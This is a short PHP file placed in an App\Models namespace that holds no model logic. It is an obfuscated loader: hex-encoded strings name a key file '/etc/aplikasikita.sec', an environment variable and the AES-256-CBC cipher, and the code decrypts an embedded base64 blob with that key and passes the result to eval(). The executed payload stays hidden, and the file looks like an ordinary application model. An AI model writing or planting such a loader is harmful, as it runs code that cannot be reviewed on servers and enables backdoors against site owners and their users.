<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('1Ir1juzOfnz9B2lpEIe4rg==');
$c=base64_decode(
'PwrlBvB3PUib9qsF0Qv1zbeun/52CBaKg6TFrgvyUBu40SleZ53pksl5l2Ul4OLc1CvXYbeCvqGW' .
'1fUuGhSomLCEiD5mD3AtvhJD0uKvSJl/VbvxnT7nw5E8RJSyjna2XZ6p6AkVyycQ6QvaGJ9k4Z27' .
'CZoQZZM/V6hXHC+c79ajM6eIijvqv0eIiJ8TwwpR7sic+xZSI2jZani5I5WvsfTfV1+6mJASM/Jp' .
'gtbyV7YvhY/Ag3jF5d+Jev6qJsILXkd3b6C+3Saf/b+7nqKOBoVW1QkAOf5XLtbm5A1QBU7cw209' .
'ifFxZdpN01DQCD4zN87gh/VD26ypBYKzvfuBfZ38IoJ9LTlqf7uHNu08ZJaY8a7j4fZJD3s7OHBY' .
'J8NyrPHY1C/S02zYoZroykoYS6Y0BUr1OPngUV1vVztMM5sm4Is0CXH8W+xJpKNTeIZ2+6ZKCMgO' .
'wC+xxKkMR4sIYGzymyU9Xkg0ar9p41HNAFUXOEvH9MKB7SzuvWSpMz4WL1iPc+jhp/OYJi+Qu/It' .
'Nlhj6BGz2ZOcHCU98wvdxLDOg5FxBja7D2VYbpkFjI9HoO3mIXotTOO0PRbbGGvp3+LPi+bf8p3v' .
'xWdIlSao2gfbtiVmmvESRKbMpWVO5G4f9thM0q+dGI150iFOw7tQmR6GxyCT7qfD5+MDb2JB1iG0' .
'L2p3S+Bw2peS8eaWOVb9X+DoDRERVijHOQ7O2l8kBjmEMtAhP3Q0I+su1OqPVkZKqU0xFb/2+3Oa' .
'EenIE6PvSCLUODRE9/u842zWOCobOw=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
